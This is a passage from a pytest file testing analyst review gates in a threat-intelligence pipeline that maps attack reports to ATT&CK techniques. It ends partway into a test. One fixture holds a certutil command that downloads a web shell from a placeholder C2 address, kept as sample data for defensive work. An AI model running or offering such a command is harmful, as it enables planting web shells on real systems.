"""Tests for gate nodes: gate_0 (entities), gate_chunks (chunks), gate_1 (drafts
and techniques), gate_2 (bundle relationships).

Tests cover:
- Normal review processing (approve, edit, remove, reject)
- Auto-skip when a gate is disabled
- Missing/malformed reviews default to approve
- Gate 1 rejection routing priority
- Gate 1 draft edits applied correctly
- Gate 2 batch approve/reject and per-relationship reviews
"""

from dataclasses import asdict

import pytest

from app.graph.state import (
    Entity,
    EntityType,
    GateAction,
    Gate1RejectReason,
    PipelineStatus,
    ProcedureDraft,
    TechniqueMapping,
)
from app.nodes.gates import gate_0, gate_1, gate_2, gate_chunks, _apply_promotions


# =============================================================================
# Fixtures
# =============================================================================

@pytest.fixture
def raw_entities():
    """Entities as they come from extract_entities (no gate_action yet)."""
    return [
        asdict(Entity(
            entity_id="ent-001",
            entity_type=EntityType.INTRUSION_SET.value,
            value="LockBit 3.0",
            confidence=0.92,
        )),
        asdict(Entity(
            entity_id="ent-002",
            entity_type=EntityType.MALWARE.value,
            value="Cobalt Strike",
            confidence=0.88,
        )),
        asdict(Entity(
            entity_id="ent-003",
            entity_type=EntityType.TOOL.value,
            value="certutil.exe",
            confidence=0.95,
        )),
        asdict(Entity(
            entity_id="ent-004",
            entity_type=EntityType.IOC_IP.value,
            value="203.0.113.10",
            confidence=0.85,
        )),
    ]


@pytest.fixture
def raw_drafts():
    """Drafts as they come from draft_procedures (no gate_action yet)."""
    return [
        asdict(ProcedureDraft(
            draft_id="dft-001",
            chunk_id="chk-001",
            name="Exploit ActiveMQ via CVE-2023-46604",
            description="Exploited RCE vulnerability for initial access.",
            techniques=[TechniqueMapping(
                technique_id="T1190",
                technique_name="Exploit Public-Facing Application",
                tactic="initial-access",
                confidence=0.87,
            )],
            confidence=87,
            sequence_index=1,
        )),
        asdict(ProcedureDraft(
            draft_id="dft-002",
            chunk_id="chk-002",
            name="Download web shell via certutil",
            description="Used certutil to transfer web shell from C2.",
            techniques=[TechniqueMapping(
                technique_id="T1105",
                technique_name="Ingress Tool Transfer",
                tactic="command-and-control",
                confidence=0.79,
            )],
            command_lines=["certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp"],
            confidence=79,
            sequence_index=2,
            predecessor_indices=[1],
        )),
        asdict(ProcedureDraft(
            draft_id="dft-003",
            chunk_id="chk-003",
            name="Execute Cobalt Strike beacon via PowerShell",
            description="PowerShell downloaded and ran a Cobalt Strike beacon.",
            techniques=[TechniqueMapping(
                technique_id="T1059.001",
                technique_name="PowerShell",
                tactic="execution",
                confidence=0.75,
            )],
            confidence=72,
            sequence_index=3,
            predecessor_indices=[2],
        )),
    ]


# =============================================================================
# Gate 0 Tests
# =============================================================================

class TestGate0:
    """Gate 0: Entity review."""

    def test_auto_skip_approves_all(self, raw_entities):
        """gates_enabled=False auto-approves every entity."""
        state = {
            "entities": raw_entities,
            "gates_enabled": False,
        }
        result = gate_0(state)

        # After processing analyst decisions (or auto-skip) the gate emits
        # RESUMING_FROM_GATE_0 so the downstream node can overwrite with
        # its own processing status without the card briefly flashing back
        # to "gate_0" in the UI.
        assert result["status"] == PipelineStatus.RESUMING_FROM_GATE_0.value
        assert result["current_node"] == "gate_0"
        validated = result["validated_entities"]
        assert len(validated) == len(raw_entities)
        for v in validated:
            assert v["gate_action"] == GateAction.APPROVE.value

    def test_all_approved(self, raw_entities):
        """Explicit approve reviews on all entities."""
        reviews = [
            {"entity_id": "ent-001", "action": "approve"},
            {"entity_id": "ent-002", "action": "approve"},
            {"entity_id": "ent-003", "action": "approve"},
            {"entity_id": "ent-004", "action": "approve"},
        ]
        state = {
            "entities": raw_entities,
            "gates_enabled": True,
            "gate0_reviews": reviews,
        }
        result = gate_0(state)
        validated = result["validated_entities"]
        assert len(validated) == 4
        for v in validated:
            assert v["gate_action"] == GateAction.APPROVE.value

    def test_remove_entity(self, raw_entities):
        """Removed entities get gate_action=remove (still in list for audit)."""
        reviews = [
            {"entity_id": "ent-004", "action": "remove", "rationale": "False positive IP"},
        ]
        state = {
            "entities": raw_entities,
            "gates_enabled": True,
            "gate0_reviews": reviews,
        }
        result = gate_0(state)
        validated = result["validated_entities"]

        # All 4 entities still present (removed ones kept for audit)
        assert len(validated) == 4

        # Check the removed one
        removed = [v for v in validated if v["entity_id"] == "ent-004"][0]
        assert removed["gate_action"] == GateAction.REMOVE.value
        assert removed["edit_rationale"] == "False positive IP"

        # Others auto-approved (no explicit review)
        others = [v for v in validated if v["entity_id"] != "ent-004"]
        for v in others:
            assert v["gate_action"] == GateAction.APPROVE.value

    def test_edit_entity_value(self, raw_entities):
        """Editing an entity applies the new value."""
        reviews = [
            {
                "entity_id": "ent-002",
                "action": "edit",
                "edited_value": "CobaltStrike",
                "rationale": "Normalized to ATT&CK canonical name",
            },
        ]
        state = {
            "entities": raw_entities,
            "gates_enabled": True,
            "gate0_reviews": reviews,
        }
        result = gate_0(state)
        validated = result["validated_entities"]

        edited = [v for v in validated if v["entity_id"] == "ent-002"][0]
        assert edited["gate_action"] == GateAction.EDIT.value
        assert edited["edited_value"] == "CobaltStrike"
        assert edited["edit_rationale"] == "Normalized to ATT&CK canonical name"

    def test_edit_entity_type(self, raw_entities):
        """Editing an entity's type applies the correction."""
        reviews = [
            {
                "entity_id": "ent-003",
                "action": "edit",
                "edited_type": EntityType.MALWARE.value,
                "rationale": "certutil is a LOLBin, not a standalone tool here",
            },
        ]
        state = {
            "entities": raw_entities,
            "gates_enabled": True,
            "gate0_reviews": reviews,
        }
        result = gate_0(state)
        edited = [v for v in result["validated_entities"] if v["entity_id"] == "ent-003"][0]
        assert edited["edited_type"] == EntityType.MALWARE.value

    def test_edit_organization_role(self):
        """edited_role on an organization entity overwrites organization_role."""
        org_entity = asdict(Entity(
            entity_id="ent-org",
            entity_type=EntityType.ORGANIZATION.value,
            value="Mandiant",
            confidence=0.95,
        ))
        # Seed an LLM-assigned (incorrect) role we expect the analyst to fix.
        org_entity["organization_role"] = "publisher"
        reviews = [{
            "entity_id": "ent-org",
            "action": "edit",
            "edited_role": "author",
            "rationale": "Mandiant is the analyst team; Google is the publisher.",
        }]
        state = {
            "entities": [org_entity],
            "gates_enabled": True,
            "gate0_reviews": reviews,
        }
        edited = [v for v in gate_0(state)["validated_entities"] if v["entity_id"] == "ent-org"][0]
        assert edited["organization_role"] == "author"
        # Did not silently overwrite location_role
        assert "location_role" not in edited

    def test_edit_location_role(self):
        """edited_role on a location entity overwrites location_role."""
        loc_entity = asdict(Entity(
            entity_id="ent-loc",
            entity_type=EntityType.LOCATION.value,
            value="South Korea",
            confidence=0.85,
        ))
        loc_entity["location_role"] = "context"
        reviews = [{
            "entity_id": "ent-loc",
            "action": "edit",
            "edited_role": "victim",
        }]
        state = {
            "entities": [loc_entity],
            "gates_enabled": True,
            "gate0_reviews": reviews,
        }
        edited = [v for v in gate_0(state)["validated_entities"] if v["entity_id"] == "ent-loc"][0]
        assert edited["location_role"] == "victim"

    def test_edit_role_routes_via_edited_type(self):
        """When the analyst also corrects edited_type, edited_role routes
        through the corrected type. The role goes to the field matching
        the post-edit entity type, not the original."""
        # Original was misclassified as organization, analyst corrects it
        # to location AND assigns location_role=victim.
        ambiguous = asdict(Entity(
            entity_id="ent-x",
            entity_type=EntityType.ORGANIZATION.value,
            value="South Korea",
            confidence=0.6,
        ))
        ambiguous["organization_role"] = "other"
        reviews = [{
            "entity_id": "ent-x",
            "action": "edit",
            "edited_type": EntityType.LOCATION.value,
            "edited_role": "victim",
        }]
        state = {
            "entities": [ambiguous],
            "gates_enabled": True,
            "gate0_reviews": reviews,
        }
        edited = [v for v in gate_0(state)["validated_entities"] if v["entity_id"] == "ent-x"][0]
        # location_role applied (post-edit type is location)
        assert edited["location_role"] == "victim"
        # organization_role left at original value (analyst routed via location)
        assert edited["organization_role"] == "other"

    def test_edit_role_silently_dropped_for_non_role_type(self):
        """edited_role on a malware/tool/ioc entity is ignored — no role
        field on those types. The edit must not corrupt unrelated fields."""
        malware_entity = asdict(Entity(
            entity_id="ent-m",
            entity_type=EntityType.MALWARE.value,
            value="StealC",
            confidence=0.92,
        ))
        reviews = [{
            "entity_id": "ent-m",
            "action": "edit",
            "edited_role": "victim",  # ignored
        }]
        state = {
            "entities": [malware_entity],
            "gates_enabled": True,
            "gate0_reviews": reviews,
        }
        edited = [v for v in gate_0(state)["validated_entities"] if v["entity_id"] == "ent-m"][0]
        assert "organization_role" not in edited
        assert "location_role" not in edited

    def test_edit_role_invalid_value_silently_dropped(self):
        """Unknown role values are dropped rather than corrupting state.
        Defends against UI bugs that send free-form strings."""
        org_entity = asdict(Entity(
            entity_id="ent-bad",
            entity_type=EntityType.ORGANIZATION.value,
            value="Acme",
            confidence=0.9,
        ))
        org_entity["organization_role"] = "publisher"
        reviews = [{
            "entity_id": "ent-bad",
            "action": "edit",
            "edited_role": "bogus_value",
        }]
        state = {
            "entities": [org_entity],
            "gates_enabled": True,
            "gate0_reviews": reviews,
        }
        edited = [v for v in gate_0(state)["validated_entities"] if v["entity_id"] == "ent-bad"][0]
        assert edited["organization_role"] == "publisher"  # unchanged

    def test_edit_author_role_accepted(self):
        """The 'author' role value is accepted by
        the processor. Regression guard against silently dropping 'author'."""
        org_entity = asdict(Entity(
            entity_id="ent-mandiant",
            entity_type=EntityType.ORGANIZATION.value,
            value="Mandiant",
            confidence=0.95,
        ))
        reviews = [{
            "entity_id": "ent-mandiant",
            "action": "edit",
            "edited_role": "author",
        }]
        state = {
            "entities": [org_entity],
            "gates_enabled": True,
            "gate0_reviews": reviews,
        }
        edited = [v for v in gate_0(state)["validated_entities"] if v["entity_id"] == "ent-mandiant"][0]
        assert edited["organization_role"] == "author"

    def test_no_reviews_auto_approves(self, raw_entities):
        """Missing gate0_reviews means all entities auto-approved."""
        state = {
            "entities": raw_entities,
            "gates_enabled": True,
            # No gate0_reviews key at all
        }
        result = gate_0(state)
        for v in result["validated_entities"]:
            assert v["gate_action"] == GateAction.APPROVE.value

    def test_invalid_action_defaults_to_approve(self, raw_entities):
        """Invalid action strings fall back to approve."""
        reviews = [
            {"entity_id": "ent-001", "action": "yolo"},
        ]
        state = {
            "entities": raw_entities,
            "gates_enabled": True,
            "gate0_reviews": reviews,
        }
        result = gate_0(state)
        ent = [v for v in result["validated_entities"] if v["entity_id"] == "ent-001"][0]
        assert ent["gate_action"] == GateAction.APPROVE.value

    def test_mixed_actions(self, raw_entities):
        """Mix of approve, edit, and remove in one batch."""
        reviews = [
            {"entity_id": "ent-001", "action": "approve"},
            {"entity_id": "ent-002", "action": "edit", "edited_value": "CobaltStrike"},
            {"entity_id": "ent-003", "action": "remove", "rationale": "Duplicate"},
            # ent-004: no review -> auto-approve
        ]
        state = {
            "entities": raw_entities,
            "gates_enabled": True,
            "gate0_reviews": reviews,
        }
        result = gate_0(state)
        validated = result["validated_entities"]

        actions = {v["entity_id"]: v["gate_action"] for v in validated}
        assert actions["ent-001"] == GateAction.APPROVE.value
        assert actions["ent-002"] == GateAction.EDIT.value
        assert actions["ent-003"] == GateAction.REMOVE.value
        assert actions["ent-004"] == GateAction.APPROVE.value

    def test_does_not_mutate_input(self, raw_entities):
        """Gate 0 should not modify the original entities list."""
        original_values = [e["value"] for e in raw_entities]
        reviews = [
            {"entity_id": "ent-001", "action": "edit", "edited_value": "CHANGED"},
        ]
        state = {
            "entities": raw_entities,
            "gates_enabled": True,
            "gate0_reviews": reviews,
        }
        gate_0(state)

        # Original entities unchanged
        current_values = [e["value"] for e in raw_entities]
        assert current_values == original_values
        assert raw_entities[0].get("gate_action") is None

    def test_empty_entities(self):
        """Empty entity list produces empty validated_entities."""
        state = {"entities": [], "gates_enabled": True, "gate0_reviews": []}
        result = gate_0(state)
        assert result["validated_entities"] == []

    # --- Denylist enforcement (deterministic guardrail) --------------------
    # Entities tagged denylisted=True by extract_entities (a promoted_to_denylist
    # pattern matched their value) must be auto-removed unless the analyst
    # explicitly overrides at the gate.

    @staticmethod
    def _denylisted_entity():
        e = asdict(Entity(
            entity_id="ent-dl",
            entity_type=EntityType.MALWARE.value,
            value="ClickFix",
            confidence=0.9,
        ))
        e["denylisted"] = True
        e["denylist_pattern_id"] = "p1"
        e["denylist_reason"] = "Matches analyst denylist (pattern p1): brand-as-malware"
        return e

    def test_denylisted_entity_auto_removed_when_untouched(self):
        """Denylisted + gate enabled + no analyst review -> auto-remove."""
        state = {
            "entities": [self._denylisted_entity()],
            "gates_enabled": True,
            "gate0_reviews": [],
        }
        v = gate_0(state)["validated_entities"][0]
        assert v["gate_action"] == GateAction.REMOVE.value
        assert "denylist" in (v.get("edit_rationale") or "").lower()

    def test_denylisted_entity_removed_on_autoskip(self):
        """The guardrail fires even when the entity gate is disabled."""
        state = {"entities": [self._denylisted_entity()], "gates_enabled": False}
        v = gate_0(state)["validated_entities"][0]
        assert v["gate_action"] == GateAction.REMOVE.value

    def test_denylisted_entity_analyst_override_keeps(self):
        """An explicit analyst approve overrides the denylist auto-remove."""
        state = {
            "entities": [self._denylisted_entity()],
            "gates_enabled": True,
            "gate0_reviews": [{"entity_id": "ent-dl", "action": "approve"}],
        }
        v = gate_0(state)["validated_entities"][0]
        assert v["gate_action"] == GateAction.APPROVE.value

    def test_non_denylisted_entities_unaffected(self, raw_entities):
        """Untagged entities follow the normal auto-approve default."""
        state = {"entities": raw_entities, "gates_enabled": True, "gate0_reviews": []}
        for v in gate_0(state)["validated_entities"]:
            assert v["gate_action"] == GateAction.APPROVE.value


# =============================================================================
# Gate 1 Tests
# =============================================================================

class TestGate1:
    """Gate 1: Procedure review."""

    def test_auto_skip_approves_all(self, raw_drafts):
        """gates_enabled=False auto-approves every draft."""
        state = {"drafts": raw_drafts, "gates_enabled": False}
        result = gate_1(state)

        # Same rationale as gate_0: RESUMING_FROM_GATE_1 is the post-submit
        # status so the next node can claim the slot cleanly.
        assert result["status"] == PipelineStatus.RESUMING_FROM_GATE_1.value
        assert len(result["gate1_approved_draft_ids"]) == 3
        assert result["gate1_rejection_routing"] is None
        for d in result["gate1_decisions"]:
            assert d["action"] == GateAction.APPROVE.value

    def test_all_approved(self, raw_drafts):
        """All drafts explicitly approved."""
        reviews = [
            {"draft_id": "dft-001", "action": "approve"},
            {"draft_id": "dft-002", "action": "approve"},
            {"draft_id": "dft-003", "action": "approve"},
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)

        assert len(result["gate1_approved_draft_ids"]) == 3
        assert result["gate1_rejection_routing"] is None

    def test_remove_draft(self, raw_drafts):
        """Removed drafts are excluded from approved list."""
        reviews = [
            {"draft_id": "dft-003", "action": "remove", "rationale": "Not a procedure"},
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)

        assert "dft-003" not in result["gate1_approved_draft_ids"]
        assert "dft-001" in result["gate1_approved_draft_ids"]
        assert "dft-002" in result["gate1_approved_draft_ids"]
        assert result["gate1_rejection_routing"] is None

    def test_edit_draft(self, raw_drafts):
        """Edited drafts are approved (with modifications) and edits applied."""
        reviews = [
            {
                "draft_id": "dft-002",
                "action": "edit",
                "analyst_edits": {"name": "Download web shell via certutil.exe"},
                "rationale": "Added .exe for clarity",
            },
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)

        # Edited draft counts as approved
        assert "dft-002" in result["gate1_approved_draft_ids"]

        # Check the draft was actually modified
        edited_draft = [d for d in raw_drafts if d["draft_id"] == "dft-002"][0]
        assert edited_draft["name"] == "Download web shell via certutil.exe"
        assert edited_draft["gate_action"] == GateAction.EDIT.value

    def test_edit_ignores_non_editable_fields(self, raw_drafts):
        """Edits to non-editable fields are ignored."""
        reviews = [
            {
                "draft_id": "dft-001",
                "action": "edit",
                "analyst_edits": {
                    "name": "New name",
                    "draft_id": "hacked-id",  # Not editable
                    "chunk_id": "hacked-chunk",  # Not editable
                },
            },
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        gate_1(state)

        draft = [d for d in raw_drafts if d["draft_id"] == "dft-001"][0]
        assert draft["name"] == "New name"
        assert draft["draft_id"] == "dft-001"  # Unchanged
        assert draft["chunk_id"] == "chk-001"  # Unchanged

    def test_edit_applies_sequence_reorder(self, raw_drafts):
        """The Gate 2 flow editor's reorder lands on the draft.

        normalize builds PRECEDES from the approved drafts' sequence_index
        and predecessor_indices, so these MUST be editable — for months the
        whitelist excluded them and every reorder was logged 'ignoring edit'
        while the analyst saw it accepted.
        """
        reviews = [
            {
                "draft_id": "dft-003",
                "action": "edit",
                "analyst_edits": {
                    "sequence_index": 1,
                    "predecessor_indices": [],
                    "branch_point": True,
                    "convergence_point": False,
                },
            },
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)

        assert "dft-003" in result["gate1_approved_draft_ids"]
        draft = [d for d in raw_drafts if d["draft_id"] == "dft-003"][0]
        assert draft["sequence_index"] == 1
        assert draft["predecessor_indices"] == []
        assert draft["branch_point"] is True
        assert draft["convergence_point"] is False
        assert draft["gate_action"] == GateAction.EDIT.value

    def test_reject_wrong_technique_routes_to_extract(self, raw_drafts):
        """WRONG_TECHNIQUE rejection routes to extract_techniques."""
        reviews = [
            {
                "draft_id": "dft-001",
                "action": "reject",
                "reject_reason": Gate1RejectReason.WRONG_TECHNIQUE.value,
                "rationale": "T1190 is wrong, should be T1210",
            },
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)

        assert result["gate1_rejection_routing"] == "extract_techniques"
        assert "dft-001" not in result["gate1_approved_draft_ids"]

    def test_reject_bad_chunk_routes_to_chunking(self, raw_drafts):
        """BAD_CHUNK_BOUNDARY rejection routes to chunk_behaviors."""
        reviews = [
            {
                "draft_id": "dft-002",
                "action": "reject",
                "reject_reason": Gate1RejectReason.BAD_CHUNK_BOUNDARY.value,
                "rationale": "This should be split into two procedures",
            },
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)

        assert result["gate1_rejection_routing"] == "chunk_behaviors"

    def test_bad_chunk_has_highest_routing_priority(self, raw_drafts):
        """BAD_CHUNK_BOUNDARY wins over WRONG_TECHNIQUE in routing."""
        reviews = [
            {
                "draft_id": "dft-001",
                "action": "reject",
                "reject_reason": Gate1RejectReason.WRONG_TECHNIQUE.value,
            },
            {
                "draft_id": "dft-002",
                "action": "reject",
                "reject_reason": Gate1RejectReason.BAD_CHUNK_BOUNDARY.value,
            },
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)

        # BAD_CHUNK_BOUNDARY takes priority
        assert result["gate1_rejection_routing"] == "chunk_behaviors"

    def test_no_reviews_auto_approves(self, raw_drafts):
        """Missing gate1_reviews means all drafts auto-approved."""
        state = {"drafts": raw_drafts, "gates_enabled": True}
        result = gate_1(state)

        assert len(result["gate1_approved_draft_ids"]) == 3
        assert result["gate1_rejection_routing"] is None

    def test_invalid_action_defaults_to_approve(self, raw_drafts):
        """Invalid action strings fall back to approve."""
        reviews = [{"draft_id": "dft-001", "action": "invalid_action"}]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)

        assert "dft-001" in result["gate1_approved_draft_ids"]

    def test_mixed_actions(self, raw_drafts):
        """Mix of approve, reject, edit, and remove."""
        reviews = [
            {"draft_id": "dft-001", "action": "approve"},
            {
                "draft_id": "dft-002",
                "action": "reject",
                "reject_reason": Gate1RejectReason.WRONG_TECHNIQUE.value,
            },
            {"draft_id": "dft-003", "action": "remove"},
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)

        assert result["gate1_approved_draft_ids"] == ["dft-001"]
        assert result["gate1_rejection_routing"] == "extract_techniques"

    def test_empty_drafts(self):
        """Empty draft list produces empty decisions."""
        state = {"drafts": [], "gates_enabled": True, "gate1_reviews": []}
        result = gate_1(state)

        assert result["gate1_decisions"] == []
        assert result["gate1_approved_draft_ids"] == []
        assert result["gate1_rejection_routing"] is None

    def test_reject_without_reason_routes_to_extract(self, raw_drafts):
        """Reject without a reason still routes to extract_techniques."""
        reviews = [
            {"draft_id": "dft-001", "action": "reject"},  # No reject_reason
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)

        # No reason in reject_reasons list, but action is still reject
        # The draft is not approved
        assert "dft-001" not in result["gate1_approved_draft_ids"]

    def test_decision_structure(self, raw_drafts):
        """Decisions have the expected keys."""
        reviews = [
            {
                "draft_id": "dft-001",
                "action": "reject",
                "reject_reason": Gate1RejectReason.HALLUCINATED.value,
                "rationale": "This behavior doesn't appear in the source",
            },
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)

        decision = [d for d in result["gate1_decisions"] if d["draft_id"] == "dft-001"][0]
        assert decision["action"] == GateAction.REJECT.value
        assert decision["reason"] == Gate1RejectReason.HALLUCINATED.value
        assert decision["rationale"] == "This behavior doesn't appear in the source"


class TestGate1CorrectionLogAndRerun:
    """Durable reject logging (A), corrective rerun feedback (B), and
    apply-inline-correction-on-reject (C)."""

    # ── Part A: durable correction log ──────────────────────────────────

    def test_reject_appended_to_correction_log(self, raw_drafts):
        reviews = [{
            "draft_id": "dft-001",
            "action": "reject",
            "reject_reason": Gate1RejectReason.WRONG_TECHNIQUE.value,
            "rationale": "T1190 wrong; this chunk is delivery, not exploit",
        }]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)

        log = result["gate1_correction_log"]
        assert len(log) == 1
        entry = log[0]
        assert entry["draft_id"] == "dft-001"
        assert entry["chunk_id"] == "chk-001"   # self-contained for the flywheel
        assert entry["action"] == "reject"
        assert entry["reject_reason"] == Gate1RejectReason.WRONG_TECHNIQUE.value
        # The LLM's (rejected) pick is captured so the flywheel knows what was wrong.
        assert any(t["technique_id"] == "T1190" for t in entry["rejected_techniques"])

    def test_correction_log_accumulates_across_passes(self, raw_drafts):
        """A later all-approve pass must NOT erase a prior pass's reject."""
        prior = [{
            "draft_id": "dft-001", "draft_name": "n", "chunk_id": "chk-001",
            "action": "reject", "reject_reason": "wrong_technique", "rationale": "x",
            "rejected_techniques": [{"technique_id": "T1190"}],
            "corrected_techniques": [], "has_correction": False,
        }]
        reviews = [{"draft_id": "dft-001", "action": "approve"}]
        state = {"drafts": raw_drafts, "gates_enabled": True,
                 "gate1_reviews": reviews, "gate1_correction_log": prior}
        result = gate_1(state)
        # No new non-approve this pass -> prior entry preserved verbatim.
        assert result["gate1_correction_log"] == prior

    def test_approve_only_logs_nothing(self, raw_drafts):
        reviews = [{"draft_id": "dft-001", "action": "approve"}]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        assert result["gate1_correction_log"] == []

    def test_edit_logs_before_and_after_techniques(self, raw_drafts):
        new_techs = [{"technique_id": "T1210",
                      "technique_name": "Exploitation of Remote Services",
                      "tactic": "lateral-movement"}]
        reviews = [{"draft_id": "dft-001", "action": "edit",
                    "analyst_edits": {"techniques": new_techs}}]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        entry = result["gate1_correction_log"][0]
        assert entry["action"] == "edit"
        # rejected = the LLM original (T1190); corrected = analyst's (T1210)
        assert any(t["technique_id"] == "T1190" for t in entry["rejected_techniques"])
        assert any(t["technique_id"] == "T1210" for t in entry["corrected_techniques"])

    def test_edit_keeps_kept_techniques_out_of_rejected(self, raw_drafts):
        """Per-action honesty: an edit's rejected_techniques holds ONLY the
        techniques the analyst removed. Kept picks appearing as 'rejected'
        were MISS-scoring patterns whose advice the analyst followed."""
        raw_drafts[0]["techniques"].append({
            "technique_id": "T1105", "technique_name": "Ingress Tool Transfer",
            "tactic": "command-and-control", "confidence": 0.7,
        })
        # Keep T1190, drop T1105, add T1059.001.
        final = [
            {"technique_id": "T1190",
             "technique_name": "Exploit Public-Facing Application",
             "tactic": "initial-access"},
            {"technique_id": "T1059.001", "technique_name": "PowerShell",
             "tactic": "execution"},
        ]
        reviews = [{"draft_id": "dft-001", "action": "edit",
                    "analyst_edits": {"techniques": final}}]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        entry = result["gate1_correction_log"][0]
        assert entry["has_correction"] is True
        assert [t["technique_id"] for t in entry["rejected_techniques"]] == ["T1105"]
        assert [t["technique_id"] for t in entry["added_techniques"]] == ["T1059.001"]
        # The kept technique lives only in the full corrected list.
        assert [t["technique_id"] for t in entry["corrected_techniques"]] == [
            "T1190", "T1059.001",
        ]

    def test_edit_noop_techniques_not_a_correction(self, raw_drafts):
        """Delete + re-add the same chip: identical list is NOT a correction.
        Previously logged a phantom 'rejected: T1190 -> correct: T1190'."""
        same = [{"technique_id": "T1190",
                 "technique_name": "Exploit Public-Facing Application",
                 "tactic": "initial-access"}]
        reviews = [{"draft_id": "dft-001", "action": "edit",
                    "analyst_edits": {"techniques": same}}]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        entry = result["gate1_correction_log"][0]
        assert entry["has_correction"] is False
        assert entry["rejected_techniques"] == []
        assert entry["corrected_techniques"] == []
        assert entry["added_techniques"] == []

    def test_edit_to_empty_list_is_strong_negative(self, raw_drafts):
        """Explicit techniques=[] means 'none of these apply' — the strongest
        negative signal. has_correction True with an empty corrected list."""
        reviews = [{"draft_id": "dft-001", "action": "edit",
                    "analyst_edits": {"techniques": []}}]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        entry = result["gate1_correction_log"][0]
        assert entry["has_correction"] is True
        assert [t["technique_id"] for t in entry["rejected_techniques"]] == ["T1190"]
        assert entry["corrected_techniques"] == []
        assert entry["added_techniques"] == []

    def test_remove_ignores_riding_technique_edits(self, raw_drafts):
        """Discarding a procedure is not a mapping correction: analyst_edits
        riding along on a remove (non-UI clients) must not log a phantom
        'analyst corrected techniques to X' on a draft they deleted."""
        reviews = [{"draft_id": "dft-001", "action": "remove",
                    "rationale": "duplicate of dft-002",
                    "analyst_edits": {"techniques": [
                        {"technique_id": "T1566.001",
                         "technique_name": "Spearphishing Attachment",
                         "tactic": "initial-access"},
                    ]}}]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        entry = result["gate1_correction_log"][0]
        assert entry["action"] == "remove"
        assert entry["has_correction"] is False
        assert entry["rejected_techniques"] == []
        assert entry["corrected_techniques"] == []
        assert entry["added_techniques"] == []

    def test_rerun_feedback_distinguishes_edit_from_reject(self, raw_drafts):
        """Rerun-feedback entries carry the action so the prompt renderer can
        render an edit as a revision instead of 'previously picked — REJECTED'
        (which steered the rerun away from techniques the analyst kept)."""
        reviews = [
            {"draft_id": "dft-001", "action": "edit",
             "analyst_edits": {"techniques": [
                 {"technique_id": "T1210",
                  "technique_name": "Exploitation of Remote Services",
                  "tactic": "lateral-movement"},
             ]}},
            {"draft_id": "dft-002", "action": "reject",
             "reject_reason": Gate1RejectReason.WRONG_TECHNIQUE.value},
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        assert result["gate1_rejection_routing"] == "extract_techniques"
        fb = {f["chunk_id"]: f for f in result["technique_rerun_feedback"]}
        assert fb["chk-001"]["action"] == "edit"
        assert fb["chk-002"]["action"] == "reject"
        assert [t["technique_id"] for t in fb["chk-001"]["added_techniques"]] == ["T1210"]

    # ── Rejects always loop; inline corrections ride as rerun hints ─────

    def test_reject_with_correction_loops_with_hint(self, raw_drafts):
        """A reject ALWAYS loops — there is deliberately no apply-and-proceed
        shortcut for a reject carrying an inline technique correction (the
        verdict UI makes 'approve + edited techniques' the only fix-and-ship
        path). The correction rides into the rerun feedback as a strong hint
        instead, keeping reject semantics uniform."""
        new_techs = [{"technique_id": "T1566.001",
                      "technique_name": "Spearphishing Attachment",
                      "tactic": "initial-access"}]
        reviews = [{"draft_id": "dft-001", "action": "reject",
                    "reject_reason": Gate1RejectReason.WRONG_TECHNIQUE.value,
                    "rationale": "delivery not exploit",
                    "analyst_edits": {"techniques": new_techs}}]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)

        # Loops to re-map; the draft is neither approved nor mutated.
        assert result["gate1_rejection_routing"] == "extract_techniques"
        assert "dft-001" not in result["gate1_approved_draft_ids"]
        draft = [d for d in raw_drafts if d["draft_id"] == "dft-001"][0]
        assert [t["technique_id"] for t in draft["techniques"]] == ["T1190"]
        # Logged for the flywheel, with the correction.
        entry = result["gate1_correction_log"][0]
        assert entry["action"] == "reject"
        assert any(t["technique_id"] == "T1566.001" for t in entry["corrected_techniques"])
        # The correction rides the rerun feedback as the strong hint.
        fb = result["technique_rerun_feedback"]
        assert len(fb) == 1
        assert fb[0]["chunk_id"] == "chk-001"
        assert any(t["technique_id"] == "T1566.001"
                   for t in fb[0]["corrected_techniques"])

    def test_reasonless_reject_routes_backward_not_forward(self, raw_drafts):
        """A reject with no reason must loop back, never silently advance."""
        reviews = [{"draft_id": "dft-001", "action": "reject"}]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        assert result["gate1_rejection_routing"] == "extract_techniques"
        assert "dft-001" not in result["gate1_approved_draft_ids"]

    # ── Part B: corrective technique rerun feedback ─────────────────────

    def test_bare_reject_builds_technique_rerun_feedback(self, raw_drafts):
